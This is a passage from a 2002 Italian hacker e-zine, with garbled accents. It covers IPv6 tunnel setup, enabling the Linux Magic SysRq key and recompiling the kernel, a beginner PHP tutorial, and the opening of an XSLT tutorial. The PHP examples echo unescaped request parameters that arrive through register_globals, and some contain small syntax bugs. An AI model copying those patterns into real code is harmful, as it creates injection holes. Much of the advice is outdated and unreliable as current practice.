| Ricompiliamo il kernel e siamo pronti per Ipv6.                          |
|                                                                          |
| &lt;Tunnel_Broker />                                                        |
| Un tunnel broker Φ un servizio che ci permette di navigare in Ipv6       |
| attraverso Ipv4. I maggiori provider di Tunnel Broker in Italia sono     |
| Edisontel e Telecomitalialab ma ci sono altri numerosi ottimi            |
| tunnel.                                                                  |
|                                                                          |
| Mi impegno per≥ a darvi qualche url di tunnel broker:                    |
| http://www.6bone.it                                                      |
| http://www.6b0ne.org                                                     |
| http://www.telecomitalialab.net                                          |
| http://www.6bone.mine.nu                                                 |
| http://www.freenet6.net                                                  |
| http://www.xs26.net                                                      |
| http://ipv6tb.he.net                                                     |
|                                                                          |
| &lt;Tunnel_Broker_Config_Windows />                                         |
| Basta dare questa semplice serie di comandi per avere il nostro          |
| servizio di tunneling ben configurato sotto windows 2k o xp.             |
| In esegui dare:                                                          |
| ipv6 rtu 2000::/3 2/::SERVERIPV4 pub                                     |
| ipv6 adu 2/TUOIPV6                                                       |
|                                                                          |
| dove SERVERIPV4 Φ l'indirizzo Ipv4 del server che ci da il               |
| tunneling e TUOIPV6 Φ l'indirizzo Ipv6 che ci ha assegnato il            |
| fornitore del servizio.                                                  |
| Ovviamente bisogna aggiornare il nostro Ipv4 sul server ad ogni          |
| connessione dial up (quando cambia l'ip) ma questo varia da              |
| fornitore a fornitore di tb                                              |
|                                                                          |
| &lt;Tunnel_Broker_Config_Linux />                                           |
| In Linux la procedura Φ un pelo pi∙ complessa poichΦ bisogna             |
| settare anche l'instradamento per Ipv6.                                  |
| L'operazione pu≥ essere per≥ sintetizzata nei seguenti comandi, da       |
| lanciare con permessi di root (superuser):                               |
|                                                                          |
| ifconfig sit0 up                                                         |
| ifconfig sit0 add TUOIPV6                                                |
| route -A inet6 add 2000::/3 gw ::SERVERIPV4                              |
|                                                                          |
| SERVERIPV4 Φ l'indirizzo Ipv4 del server mentre TUOIPV6 Φ il nostro      |
| indirizzo Ipv6 fornito dal server di tunneling.                          |
|                                                                          |
| Anche in questo sistema operativo bisogna aggiornare il nostro Ipv4      |
| sul server e ci≥ pu≥ essere fatto con la moltitudine di script           |
| preconfezionati o con il semplice utilizzo di wget o lynx e un po'       |
| di bash.                                                                 |
|                                                                          |
| &lt;Applicazioni_Ipv6_Ready />                                              |
| Praticamente inesistenti su Windows, le applicazioni Ipv6 su linux       |
| non mancano :-)                                                          |
| Unico programma Ipv6 Ready su windows Φ la versione alpha di Kvirc       |
| mentre per il resto Φ necessario un piccolo bouncer ipv4/ipv6            |
| chiamato relay6,                                                         |
| facilmente trovabile online con un ricerca su google.                    |
| In linux basta ricompilare i programmi con il flag --enable-ipv6 e       |
| avremo il supporto della maggioranza dei software.                       |
|                                                                          |
| &lt;In_realtα />                                                            |
| Nella realtα l'utilizzo intensivo di Ipv6 Φ veramente lontano e          |
| questi non entrerα a far parte della vera internet prima del             |
| 2005-2006...                                                             |
| Speriamo bene e che Ipv6 non ci assicuri brutte sorprese come ha         |
| fatto lo stack Tcp/IP negli ultimi tempi...                              |
|                                                                          |
| &lt;Conclusione />                                                          |
| Ora siamo pronti per Ipv6. Mi raccomando fatene buon uso :-)             |
|                                                                          |
| Master^Shadow /// HX Crew                                                |
| Email: mastershadow&lt;at>hackzxtreme&lt;dot>cjb&lt;dot>net                       |
|                                                                          |
| &lt;Saluti />                                                               |
| Colgo l'occasione per salutare tutti gli amici che mi accompagnano       |
| giorno dopo giorno in fantastiche discussioni, specialmente:             |
| JeyOne, AndreaGeddon, _D31m0s_, Bartx, ThEgAmEr, JHTritolo,              |
| Quequero, Quake2^AM, fDiskolo, Fen0x, TheMR, Vinx2o2o e tutti            |
| quelli che ho involontariamente dimenticato :-P                          |
| Ovviamente un grosso ciao anche a tutti i fratelli di HackzXtreme        |
| Crew e agli amici di UIC e di Ondaquadra!                                |
+--------------------------------------------------------------------------+


+--------------------------------------------------------------------------+
| ONDAQUADRA ~ LiNUX                                      #08 - 01/11/2002 |
| LMSRK                                                  [spyro] 0x09/0x1A |
+--------------------------------------------------------------------------+
| Linux Magic System Request Key                                           |
|                                                                          |
|                                                                          |
| Magic system request key Φ una funzione del kernel introdotta dalla      |
| versione 2.2.x in poi.                                                   |
| Questa funzione serve a richiamare e a dare comandi(quindi tramite       |
| tastiera) al nostro kernel nel caso in  cui per esempio vada in kernel   |
| panic o si blocchi per altre motivazioni.                                |
| Perl abilitarlo nel propio kernel, dobbiamo mettere yes alla richiesta:  |
|                                                                          |
| 'Magic SysRq key (CONFIG_MAGIC_SYSRQ)'                                   |
|                                                                          |
| nella configurazione del kernel ,mettendolo in modalitα built-in.        |
| Una volta che abbiamo il kernel con supporto SysRq compilato, pu≥        |
| essere disabilitato il comando:                                          |
|                                                                          |
|  echo "0" > /proc/sys/kernel/sysrq                                       |
|                                                                          |
| Le versioni precedenti disabilitavano sysrq di default, e si era         |
| richiesti di abilitarlo specificatamente al run.time, ma adesso non Φ    |
| pi∙ cos∞.                                                                |
|                                                                          |
| La combinazione dei tasti, varia da piattaforma a piattaforma.           |
| Ecco uno schemettino che vi renderα meglio l'idea:                       |
|                                                                          |
| Piattaforma      Tasti di coamando             Commento                  |
| x86              ALT-SYSRQ-[tasti di comando]    SYSRQ = Print Screen    |
| SPARC            ALT-STOP-[tasi di comando]                              |
| PowerPC  ALT-Print Screen-[tasti di coamndo] Print screen,altrimenti F13 | 
|                                                                          |
| E Adesso tabella con i tasti magici ;)                                   |
| Tasto              Funzione                                              |
|  s                Tenta di sincronizzare tutti i file system             |
|                   precedentemente montati                                |
|                                                                          |
|  u                Tenta di rimontare tutti i file system                 |
|                   precedentemente montati(mount)                         |
|                   in modalitα read-only(sola lettura)                    |
|                                                                          |
|  b                Tenta di reboottare all'instante il sistema            |
|                   (Cos∞ da non danneggiare o bloccare il sistema         |
|                    ulteriormente, cosa che potrebbe accadere             |
|                    premendo il tasto di reboot dal computer)             |
|                                                                          |
|  p                Stampa i settaggi dei registri e le flag correnti,     |
|                   nell'attuale console di lavoro                         |
|                                                                          |
|  t                Stampa la lista dei tasks e le sue relative            |
|                   informazioni correnti, nell'attuale console di lavoro  |
|                                                                          |
|  e                Manda un segnale SIGTERM a tutti i processi,           |
|                   a eccezzione di quelli caricati dall'init              |
|                                                                          |
|  i                Manda un segnale SIGKILL a tutti i processi,           |
|                   a eccezzione di quelli caricati dall'init              |
|                                                                          |
|  l                Manda un segnale SIGKILL a tutti i processi(init       |
|                   inclusi)                                               |
|                                                                          |
|                                                                          |
|                                                                          |
| Dove trovo nel kernel la sezione per abilitare Magic sys request?        |
| Faccio esempio dalla mia slackware con kernel 2.4.x                      |
| Prima di tutto entrare nella dir contenente i sorgenti:                  |
|                                                                          |
| # cd /usr/src/linux                                                      |
|                                                                          |
| (naturalmente bisogna avere privilegi  root)                             |
| Facciamo partire il programma di configurazione:                         |
|                                                                          |
| # make menuconfig                                                        |
|                                                                          |
| (In testuale)                                                            |
| Se volete la versione grafica:                                           |
|                                                                          |
| # make xconfig                                                           |
|                                                                          |
| Adesso dal menu andiamo fino all'ultima voce:                            |
| Kernel hacking ---->                                                     |
|                                                                          |
| Permiamo invio                                                           |
| Ci troveremo  davanti:                                                   |
|                                                                          |
| [_] Kernel Debugging                                                     |
|                                                                          |
| Selezioniamolo e premiamo lo space(barra di scorrimento):                |
|                                                                          |
| Si aprirα un menu ad albero, tra cui la voce:                            |
|                                                                          |
| [_] Magic SysRq key                                                      |
|                                                                          |
| Andiamoci sopra,premiamo lo space in modo da abilitarlo in modalitα      |
| buil-in.                                                                 |
| Quindi adesso comparirα come:                                            |
|                                                                          |
| [*] Magic SysRq key                                                      |
|                                                                          |
| Adesso ci comparira` la domanda:  Do you wish to save your new kernel    |
| configuration?                                                           |
|                                                                          |
| E noi premiamo su YES .                                                  |
|                                                                          |
| (Cos∞ facendo salveremo le modifiche del kernel appena eseguite)         |
|                                                                          |
| Ok adesso diamo i comandi:                                               |
|                                                                          |
|                                                                          |
| 1)make dep                                                               |
|                                                                          |
|                                                                          |
| 2)make clean                                                             |
|                                                                          |
|                                                                          |
| 3)make bzImage                                                           |
|                                                                          |
|                                                                          |
| 4)make modules                                                           |
|                                                                          |
|                                                                          |
| 5)make modules_install                                                   |
|                                                                          |
|                                                                          |
| Questi sono i 5 comandi che si danno di solito per ricompilare il        |
| kernel.                                                                  |
|                                                                          |
| Spiegazione comandi:                                                     |
|                                                                          |
|                                                                          |
| 1) make dep: controlla le dipendenze                                     |
|                                                                          |
|    esempio:                                                              |
|    noi attiviamo il supporto framebuffer ma non attiviamo la vga, ci     |
|    pensa lui.                                                            |
|                                                                          |
|                                                                          |
| 2) make clean: elimina i file oggetto delle vecchie compilazioni         |
|                                                                          |
|                                                                          |
| 3) make bzImage: Crea il nuovo kernel                                    |
|                                                                          |
|                                                                          |
| 4) make modules: crea i moduli                                           |
|                                                                          |
|                                                                          |
| 5) make modules_install: installa moduli in /lib/modules                 |
|                                                                          |
|                                                                          |
| Adesso ci vorrα un po prima che compili tutto, quindi non                |
| preoccupatevi,lo deve fare :)                                            |
|                                                                          |
|                                                                          |
| Adesso che abbiamo finito dobbiamo provare il nuovo kernel.              |
|                                                                          |
| Entriamo nella dir. /usr/src/linux/arch/i386/boot e copiamo il nuovo     |
| kernel nella directory /boot .                                           |
|                                                                          |
|                                                                          |
| cd /usr/src/linux/arch/i386/boot                                         |
|                                                                          |
|                                                                          |
| mv bzImage /boot/newkernel                                               |
|                                                                          |
|                                                                          |
| In questo modo copiamo il nuovo kernel nella dir. /boot chiamandolo      |
| newkernel .                                                              |
|                                                                          |
|                                                                          |
| Adesso creiamo un nuovo label nel LILO per provare il nuovo kernel.      |
|                                                                          |
| Questo xche` se il nuovo kernel avra` problemi e crasha, noi avremo la   |
| possibilita` di usare quello                                             |
|                                                                          |
| originale ovvero quello funzionante.                                     |
|                                                                          |
|                                                                          |
| Creeiamo un nuovo label.                                                 |
|                                                                          |
| Editiamo lilo.conf, che trovermeo nella dir. /etc ,con un qualsiasi      |
| editor di testo e aggiungiamo le                                         |
|                                                                          |
| seguenti righe:                                                          |
|                                                                          |
| image = /boot/newkernel                                                  |
|                                                                          |
|   root = /dev/hda6                                                       |
|                                                                          |
|   label = newkernel                                                      |
|                                                                          |
|   read-only                                                              |
|                                                                          |
|                                                                          |
|                                                                          |
| Spiegazione:                                                             |
|                                                                          |
| image = /boot/newkernel : Il kernel che lilo deve caricare               |
|                                                                          |
| root = /dev/hda6   : Partizione in cui e` installato il Mount Point /    |
|                                                                          |
| label = newkernel       : Nome che andra` digitato per caricare il       |
| kernel /boot/newkernel                                                   |
|                                                                          |
| read-only          : In questo modo al momento del boot la partizione    |
| sara` disponibile solo in lettura                                        |
|                                                                          |
| I dati qua sopra citati potete lascialri tutti come li ho settati io,    |
| tranne root = /dev/hda6 .                                                |
|                                                                          |
| Li` dovrete mettere la vostra partizione root.                           |
|                                                                          |
| Se non sapete qual'Θ, basta che controllate quella del label linux(di    |
| solito si chiama cosi`).                                                 |
|                                                                          |
|                                                                          |
|                                                                          |
| -------------------------------LiLo.C0nf------------------------------   |
| boot = /dev/hda                                                          |
|                                                                          |
| message = /boot/boot_message.txt                                         |
|                                                                          |
| prompt                                                                   |
|                                                                          |
| timeout = 1200                                                           |
|                                                                          |
|                                                                          |
|                                                                          |
| other = /dev/hda1                                                        |
|                                                                          |
|   label = DOS                                                            |
|                                                                          |
|   table = /dev/hda                                                       |
|                                                                          |
|                                                                          |
|                                                                          |
| image = /boot/mvlinuz                                                    |
|                                                                          |
|   root = /dev/hda6                                                       |
|                                                                          |
|   label = Linux                                                          |
|                                                                          |
|   read-only                                                              |
| -------------------------------LiLo.C0nf------------------------------   |
|                                                                          |
| Come si nota il label linux usufruisce della partizione root /dev/hda6,  | 
| quindi il nostro lilo.conf                                               |
|                                                                          |
| modificato sara`:                                                        |
|                                                                          |
| -------------------------------LiLo.C0nf------------------------------   |
|                                                                          |
| boot = /dev/hda                                                          |
|                                                                          |
| message = /boot/boot_message.txt                                         |
|                                                                          |
| prompt                                                                   |
|                                                                          |
| timeout = 1200                                                           |
|                                                                          |
|                                                                          |
|                                                                          |
| other = /dev/hda1                                                        |
|                                                                          |
|   label = DOS                                                            |
|                                                                          |
|   table = /dev/hda                                                       |
|                                                                          |
|                                                                          |
|                                                                          |
| image = /boot/newkernel                                                  |
|                                                                          |
|   root = /dev/hda6                                                       |
|                                                                          |
|   label = newkernel                                                      |
|                                                                          |
|   read-only                                                              |
|                                                                          |
|                                                                          |
|                                                                          |
| image = /boot/mvlinuz                                                    |
|                                                                          |
|   root = /dev/hda6                                                       |
|                                                                          |
|   label = Linux                                                          |
|                                                                          |
|   read-only                                                              |
|                                                                          |
| -------------------------------LiLo.C0nf------------------------------   |
|                                                                          |
| Adesso salviamo e chiudiamo il file lilo.conf                            |
|                                                                          |
| Dovremo far attuare le modifiche a lilo, tutto questo dando il comando:  | 
| lilo                                                                     |
|                                                                          |
| In questo modo eseguiremo lilo, che controllera` l'esistenza del kernel  | 
| nuovo da boottare.                                                       |
|                                                                          |
| Non ci resta altro da fare che reboottare la macchina, e quando parte    |
| il boot loader lilo scrivere:                                            |
|                                                                          |
| newkernel                                                                |
|                                                                          |
| in questo modo partirα il nostro nuovo kernel con magic sys request key  | 
| attivo.                                                                  |
|                                                                          |
| Se notate che il nuovo kernel non dα + problemi, potete eliminare il     |
| vecchio kernel e relativo label nel lilo.conf .                          |
|                                                                          |
| Nel kernel 2.2.x, la funzione:                                           |
|                                                                          |
|                                                                          |
| [_] Magic SysRq key                                                      |
|                                                                          |
| Si trova sempre sotto la voce Kernel hacking.                            |
| Poi x la compilazione del kenrel e la configurazione di lilo, leggere    |
| le istruzioni sopra riportate.                                           |
| Beh, anche per questa volta Φ tutto.                                     |
| Per maggior informazioni vi mando alla documentazione presente nella     |
| directory dei doc del sorgenti del kernel                                |
| (/usr/src/linux/Documentation/sysrq.txt).                                |
|                                                                          |
| Un saluto dal vostro SPYRO                                               |
|                                                                          |
| _________________________________                                        |
|                                  |                                       |
| E-mail: spyro2600[at]yahoo.it    |                                       |
|                                  |                                       |
| Url: www.spyrohack.com           |                                       |
| _________________________________|                                       |
|                                                                          |
+--------------------------------------------------------------------------+


+--------------------------------------------------------------------------+
| ONDAQUADRA ~ C0DiNG                                     #08 - 01/11/2002 |
| iNTR0DUZi0NE A PHP                                 [Lethalman] 0x0A/0x1A |
+--------------------------------------------------------------------------+
| Indice:                                                                  |
|                                                                          |
| 1.0 Nozioni principali                                                   |
|     1.1 Php in poche parole                                              |
|     1.2 Il php nell'html                                                 |
|     1.3 Variabili                                                        |
|     1.4 Echo su pi∙ righe                                                |
|                                                                          |
| 2.0 Approfondimenti                                                      |
|     2.1 If, else, elseif                                                 |
|     2.2 Form                                                             |
|     2.3 While                                                            |
|     2.4 For                                                              |
|     2.5 Switch                                                           |
|                                                                          |
| 3.0 Fine                                                                 |
|     3.1 Nelle prossime puntate                                           |
|     3.2 Links utili                                                      |
|     3.3 Conclusioni                                                      |
|                                                                          |
| Requisiti:                                                               |
| Una buona base html                                                      |
| Una buona base di programmazione generale                                |
|  __________________________                                              |
| |                          |                                             |
| | 1.0 - Nozioni principali |                                             |
| |__________________________|                                             |
|  __________________________                                              |
| | 1.1 - Php in poche parole                                              |
|                                                                          |
| Uno script php Φ semplicemente una pagina html all'interno della quale   |
| viene inserito il codice, cioΦ le istruzioni che costituiscono il        |
| programma. Per questo motivo php viene descritto come un                 |
| linguaggio "html-embedded". Il codice php viene eseguito sul server      |
| prima che la pagina venga inviata al broswer (il "client"); il client,   |
| quindi, vedrα solo il risultato (cioΦ l'output) del programma php.       |
|  _______________________                                                 |
| | 1.2 - Il php nell'html                                                 |
|                                                                          |
| Il primo esempio che vedremo sarα, inevitabilmente, il classico          |
| messaggio di saluto "Ciao mondo" e ci servirα per mostrare la sintassi   |
| da utilizzare per includere codice php in una pagina web. Ecco il        |
| nostro sorgente:                                                         |
|                                                                          |
| &lt;html>&lt;head>                                                             |
| &lt;title>Prova php&lt;/title>&lt;/head>                                          |
| &lt;body>                                                                   |
|                                                                          |
| <?php // Questo Φ un commento su una riga. <? serve a dichiarare         |
| l'inizio del php                                                         |
| echo "&lt;h1>Ciao mondo!&lt;/h1>"; /* Commento a pi∙ righe. Con il comando     |
| echo() abbiamo "stampato" nella pagina html 'Ciao mondo' */              |
| ?> // Fine php                                                           |
|                                                                          |
| &lt;/body>                                                                  |
| &lt;/html>                                                                  |
|                                                                          |
| Il risultato della pagina (html) sarα:                                   |
|                                                                          |
| &lt;html>&lt;head>                                                             |
| &lt;title>Prova php&lt;/title>&lt;/head>                                          |
|                                                                          |
| &lt;h1>Ciao mondo!&lt;/h1>                                                     |
|                                                                          |
| &lt;/body>                                                                  |
| &lt;/html>                                                                  |
|                                                                          |
| Come avrete visto non c'Φ ALCUNA TRACCIA del sorgente php ma solo        |
| dell'output generato dal php.                                            |
|  ______________                                                          |
| | 1.3 Variabili                                                          |
|                                                                          |
| Le variabili in php si identificano con il segno $ davanti al nome       |
| della variabile: $variabile. Facciamo qualche esempio:                   |
|                                                                          |
| <?                                                                       |
| echo "Le variabili numeriche devono essere settate senza apice";         |
| $a = 1; // Immetto il valore 1 nella variabile $a                        |
| $b = 2;                                                                  |
| $c = $a + $b; // Faccio la somma tra $a e $b e lo metto in $c            |
| echo "$c"; // Infine stampo il risultato                                 |
| echo "&lt;br>&lt;br>";                                                         |
| echo "Le variabili contenenti stringhe devono essere settate con gli     |
| apici";                                                                  |
| $str = "Ciao"; // Metto la stringa "Ciao" nella variabile $str           |
| echo "$str";                                                             |
| ?>                                                                       |
|                                                                          |
| Guardate il risultato col vostro broswer. Come avrete capito, le         |
| variabili contenenti numeri devono essere messe senza apici e le         |
| stringhe con gli apici. Potete anche mettere i numeri negli apici ma     |
| pi∙ avanti vi riscontrerete con alcuni problemini. Comunque c'Φ          |
| qualcosa che... ma certo. Allora le variabili le posso anche mettere     |
| nell'html. Ecco come:                                                    |
|                                                                          |
| <?                                                                       |
| $link = "http://www.ondaquadra.cjb.net";                                 |
| echo "&lt;a href=\"$link\">Link&lt;/a>"; /* Avete giα capito come va a         |
| finire. Ma... cos'Φ \" ? Mettendo " echo si chiuderebbe e poi si         |
| riaprirebbe e succederebbe un casino. Mentre con \" simula il vero "     |
| che poi verrα stampato normalmente */                                    |
| ?>                                                                       |
|  ________________________                                                |
| | 1.4 - Echo su pi∙ righe                                                |
|                                                                          |
| Non vi spaventate. E' sempre il nostro comando echo fatto a pi∙ righe.   |
| Guardate questo sorgente:                                                |
|                                                                          |
| <?                                                                       |
| echo "Ciao come" // Senza ; vado daccapo e continuo su l'altra riga      |
| ."va ?"; // Qui finisce l'echo su pi∙ righe                              |
| $var = "Bene";                                                           |
| echo "&lt;br>"                                                              |
| ."$var"                                                                  |
| ." e tu?";                                                               |
| ?>                                                                       |
|                                                                          |
| Questo forse vi sembrerα non importante ma cretetemi, prima o poi vi     |
| servirα di certo.                                                        |
|  _______________________                                                 |
| |                       |                                                |
| | 2.0 - Approfondimenti |                                                |
| |_______________________|                                                |
|                                                                          |
| Bene. Spero avrete letto bene, moooolto bene le cose precedenti perchΦ   |
| adesso si comincia un p≥ ad andare nel profondo. Quindi mano alla        |
| tastiera e occhi sulla guida :P                                          |
|  _______________________                                                 |
| | 2.1 - If, else, elseif                                                 |
|                                                                          |
| Immancabile in ogni linguaggio di programmazione Φ la condizione. In     |
| php si usa cos∞:                                                         |
|                                                                          |
| <?                                                                       |
| $numero = 5;                                                             |
| if ($numero == 5) { // Se $numero Φ uguale a 5 allora                    |
|   echo "Il numero Φ 5"; // Stampa che il numero Φ 5                      |
| } elseif ($numero < 10 && $numero > 5) { /* && sta per: 'e' mentre ||    |
| (che qui non c'Φ) sta per: 'o' */                                        |
|   echo "Il numero Φ tra 5 e 10";                                         |
| } else { // Altrimenti...                                                |
|   echo "Non Φ 5"; // ...stampa che non Φ 5                               |
| } // Fine condizione                                                     |
| ?>                                                                       |
|                                                                          |
| Ecco un semplice esempio della struttura if. Comunque non c'Φ solo il    |
| segno: == ma:                                                            |
|                                                                          |
| == uguale                                                                |
| != diverso                                                               |
| < minore                                                                 |
| > maggiore                                                               |
| <= minore o uguale                                                       |
| >= maggiore o uguale                                                     |
|                                                                          |
| Adesso ho citato solo questi.                                            |
|  ___________                                                             |
| | 2.2 - Form                                                             |
|                                                                          |
| I form sono molto importanti per un migliore passaggio di informazioni   |
| da una pagina ad un'altra. Vediamo come possiamo sfruttarli in php.      |
| Creiamo 2 file di nome rispettivamente news.php e elaborato.php. Il      |
| file news.php ci servirα dopo. Adesso prendiamo in considerazione        |
| elaborato.php e scriviamo nel file:                                      |
|                                                                          |
| <?                                                                       |
| echo "$segno";                                                           |
| ?>                                                                       |
|                                                                          |
| Che cos'Φ $segno? Provate a digitare nella vostra bella barra di         |
| navigazione: sito/elaborato.php?segno=Ciao                               |
|                                                                          |
| Che cosa succede? Per magia Φ comparso "Ciao". E cos'Φ successo:         |
| elaborato.php Φ il file. ? serve per passare dei dati al file, che in    |
| questo caso Φ elaborato.php. I dati passati sono: segno=Ciao, come se    |
| fosse una variabile. Ma... che c'Φ di familiare? Ah ecco. $segno e       |
| segno. Infatti segno=Ciao e come scrivessimo prima del file: $segno      |
| = "Ciao" e quindi... avrete giα capito tutto. Vi ho spiegato in parole   |
| povere come funziona il passaggio dei dati. Adesso vi chiederete: "Che   |
| cavolo c'Φ lo hai fatto a fare news.php?" Φ presto detto. Questo era     |
| solo per farvi capire come funziona il passaggio dati. Adesso andiamo    |
| ai form. Cosa fanno i form? Passano i dati :D. Scriviamo in news.php:    |
|                                                                          |
| <?                                                                       |
| echo "&lt;form action=\"elaborato.php\" method=\"post\">\n";                |
| echo "Valore segno: &lt;input type=\"text\" name=\"segno\">\n";             |
| echo "&lt;input type=\"submit\" value=\"Invia\">\n";                        |
| echo "&lt;/form>";                                                          |
| ?>                                                                       |
|                                                                          |
| Provate adesso :D Guarda un p≥, esce quello che ho scritto nella         |
| textbox, come mai? Beh io vi avevo avvertito di avere una buona base     |
| html no? Il form passa i dati al file elaborato.php, in questo caso il   |
| dato Φ 'segno' eh... capito come funziona vero? Passiamo a qualcosa di   |
| pi∙ costruttivo. Scrivete in news.php:                                   |
|                                                                          |
| <?                                                                       |
| echo "&lt;center>&lt;h1>News&lt;/h1>&lt;/center>&lt;br>&lt;br>\n";                         |
| echo "&lt;a href=\"elaborato.php?news=calcio\">Calcio&lt;/a> - &lt;a              |
| href=\"elaborato.php?news=f1\">Formula 1&lt;/a> - &lt;a href=\"elaborato.php?  |
| news=basket>Basket&lt;/a>";                                                 |
| ?>                                                                       |
|                                                                          |
| e adesso scrivete in elaborato.php:                                      |
|                                                                          |
| <?                                                                       |
| if ($news == calcio) {                                                   |
|   echo "La Juventus ha comprato un nuovo giocatore";                     |
| } elseif ($news == f1) {                                                 |
|   echo "Shumaker ha vinto ancora";                                       |
| } elseif ($news == basket) {                                             |
|   echo "Mycol Jordan si Φ ritirato";                                     |
| }                                                                        |
| ?>                                                                       |
|                                                                          |
| OK. Adesso aprite news.php e selezionate le news desiderate.             |
|  ____________                                                            |
| | 2.3 - While                                                            |
|                                                                          |
| L'intramontabile ciclo while eccolo anche su questi schermi.             |
|                                                                          |
| <?                                                                       |
| $x = 1;                                                                  |
| while($x < 10) { // Finquando $x Φ minore di 10                          |
|   echo "$x - "; // Stampa $x                                             |
|   $x++; // Aumenta di 1 $x con ++ mentre -- decrementa di 1 la variabile | 
| }                                                                        |
| ?>                                                                       |
|                                                                          |
| Semplice vero? Beh, Φ inutile che faccia altri esempi se avete capito    |
| le cose precedenti. Andiamo avanti.                                      |
|  __________                                                              |
| | 2.4 - For                                                              |
|                                                                          |
| Ed ecco l'altro mitico, immancabile ciclo For. Esempio:                  |
|                                                                          |
| $y = 10;                                                                 |
| for($x = 0; $x < $y; $x++) { /* Setta $x a 0, esegui finquando $x < $y   |
| e aumenta $x di 1: $x++ */                                               |
| echo "$x - ";                                                            |
| }                                                                        |
|                                                                          |
| In poche parole fa quello che abbiamo detto con while ma non pensiate    |
| che sia la stessa cosa, dipende dall'uso che se ne deve fare.            |
|  ____________                                                            |
| | 25 - Switch                                                            |
|                                                                          |
| Questa Φ una cosa perlopi∙ indispensabile per i webmaster pi∙ esigenti.  | 
| Vi ricordate quella faticata delle news? Riprendiamole:                  |
|                                                                          |
| news.php:                                                                |
| <?                                                                       |
| echo "&lt;center>&lt;h1>News&lt;/h1>&lt;/center>&lt;br>&lt;br>\n";                         |
| echo "&lt;a href=\"elaborato.php?news=calcio\">Calcio&lt;/a> - &lt;a              |
| href=\"elaborato.php?news=f1\">Formula 1&lt;/a> - &lt;a href=\"elaborato.php?  |
| news=basket>Basket&lt;/a>";                                                 |
| ?>                                                                       |
|                                                                          |
| elaborato.php:                                                           |
| <?                                                                       |
| switch($news) { // Prendiamo in considerazione la variabile $news...     |
|   case "calcio": // ... e se in caso Φ = calcio allora...                |
|     echo "La Juventus ha comprato un giocatore"; // ... fai questo       |
|     break; // Fine case                                                  |
|   case "f1"; // stessa cosa di sopra                                     |
|     echo "Shumaker ha vinto ancora";                                     |
|     break;                                                               |
|   case "basket";                                                         |
|     echo "Non ne capiamo";                                               |
|     break;                                                               |
|   default: /* Oh, e questo cos'Φ? Questo Φ quando non c'Φ $news ovvero   |
| elaborato.php e basta */                                                 |
|     echo "Devi selezionare una news da news.php";                        |
|     break;                                                               |
| } // Fine switch                                                         |
| ?>                                                                       |
|                                                                          |
| Bene, come avrete capito questa funzione Φ mooolto interessante vero?    |
| Bene, sappiatela usare  ed avrete delle pagine molto pi∙ dinamiche di    |
| una normale pagina html.                                                 |
|  ____________________                                                    |
| |                    |                                                   |
| | 3.0 - Fine         |                                                   |
| |____________________|                                                   |
|                                                                          |
| Fine della guida (per adesso perchΦ ne far≥ altre sempre per il php).    |
|  _____________________________                                           |
| | 3.1 - Nelle prossime puntate                                           |
|                                                                          |
| Nelle prossime guide sul php fatte da me troverete qualcosa che vi pu≥   |
| interessare tipo date, altre info ma il pi∙ scottante Φ mysql. Infatti   |
| parleremo soprattutto del database mysql, come connettersi, selezionare  | 
| database, tabelle ecc.                                                   |
|  __________________                                                      |
| | 3.2 - Links utili                                                      |
|                                                                          |
| Qualche link utile ci vuole sempre:                                      |
| www.php.net - Homepage ufficiale                                         |
| www.phpitalia.com                                                        |
| http://php.resourceindex.com                                             |
|  _________________                                                       |
| | 3.3 - Conlusioni                                                       |
|                                                                          |
| Come avrete visto il php non Φ nulla di straordinario a programmarlo ma  | 
| Φ molto potente specialmente come vedremo nelle prossime puntate.        |
|                                                                          |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ C0DiNG                                     #08 - 01/11/2002 |
| iL SUCCESS0RE Di XSL                               [cyberdude] 0x0B/0x1A |
+--------------------------------------------------------------------------+
| XSLT TUTORIAL BY CYBERDUDE                                               |
|                                                                          |
|                                                                          |
| Introduzione                                                             |
|                                                                          |
| Ciao a tutti ragazzi,sono cyberdude, a quanto pare ci reincontriamo      |
| ancora hihiihi ebbene si, non me ne vogliono proprio mandare da questa   |
| crew! Dunque ragazzi, non so chi mi ha dato il coraggio di cominciare    |
| a scrivere questo tutorial,forse questo fatto dipende dalla cosa che     |
| io non conosco ancora questo linguaggio, infatti ho da poco comprato     |
| in cartolibreria un mensile che non sto qui a citare per non fare        |
| pubblicitα inutile, nel quale Φ uscito questa guida! Quindi mentre       |
| le leggo, scriver≥ in questo documento di testo quello che ne capisco!   |
| ok? Sto ascoltando Certe notti di Ligabue nella veranda di casa mia      |
| con il sole che mi batte in testa, sono le 2 del pomeriggio, oggi Φ      |
| finalmente sabato!! sono da poco uscito da scuola, aspetto con ansia     |
| l'arrivo dell'estate (siamo in Aprile)e in questo paradiso terrestre     |
| inzia il mio studio all'XSLT !! Voi sarete i miei compagni di studio     |
| iniziamo? Ok dai... pronti... partenza... via !!                         |
| _____________                                                            |
| XSLT TUTORIAL                                                            |
| By Cyberdude                                                             |
| _____________                                                            |
| XSL o eXtensible Stylesheet Language, Φ un linguaggio XML creato         |
| inizialmente per fornire a XML un supporto per la formattazione          |
| simile a CSS, ma potenziato per riflettere il linguaggio su cui viene    |
| applicato, che non Φ pi∙ HTML o almeno questo Φ quanto io ne ho capito   |
| vabbΦ dai Φ proprio cos∞! XSLT (XSL Transformations) Φ il successore     |
| di XSL, ed estende il concetto di foglio di stile fino a permettere      |
| la manipolazione della struttura stessa del documento... infatti         |
| permette di trasformare un documento XML filtrandone i dati e            |
| riorganizzandoli in unÆaltra struttura XML!! capito? Beh che dire,       |
| sappiate che XSLT possiede molte delle caratteristiche di un             |
| linguaggio di programmazione imperativo! ok?                             |
| << Possiamo intendere XSLT >>                                            |
| - come formattatore                                                      |
| - come trasformatore                                                     |
| andiamo ad analizzare entrambi i casi ... Xslt , Φ                       |
|                                                                          |
| .     formattatore > Per quel che riguarda lÆabilitα di generare una     |
|       presentazione dei dati XML, XSLT dispone attualmente di due        |
|       metodi:                                                            |
| - EÆ possibile trasformare il documento XML in un documento XHTML, per   |
|   poi farlo visualizzare in qualsiasi browser.                           |
| - EÆ possibile usare gli XSL Formatting Objects, che definiscono il      |
|   formato di visualizzazione senza presupporre la trasformazione in      |
|   HTML o in altri linguaggi di presentazione.                            |
|                                                                          |
| .     trasformatore > Questa funzionalitα, del tutto nuova, Φ la pi∙     |
|       interessante. Con XSLT Φ possibile modificare ôal voloö la         |
|       struttura che accoglie i dati, e in parte anche i dati stessi.     |
|       Questo permette, ad esempio:                                       |
|                                                                          |
| - di offrire viste differenti sugli stessi dati a utenti differenti.     |
